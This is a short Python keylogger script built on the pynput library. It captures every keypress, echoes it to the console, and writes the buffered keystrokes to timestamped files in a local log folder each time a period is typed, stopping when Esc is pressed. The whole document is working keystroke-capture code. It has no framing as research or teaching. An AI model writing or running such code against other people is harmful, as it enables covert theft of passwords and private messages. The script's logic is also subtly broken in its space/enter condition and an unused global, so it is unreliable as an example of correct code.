import pynput
import time
import os
from pynput.keyboard import Key, Listener


keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    print("{0} pressed".format(key))

    if "{0}".format(key) == "'.'":
        writefile(keys)
        keys = []

def writefile(keys):
    timestr = time.strftime("%Y%m%d-%H%M-%S") + ".txt"
    os.makedirs(os.path.dirname("log/"), exist_ok=True)
    with open("log/"+timestr, "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0 | k.find("enter"):
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()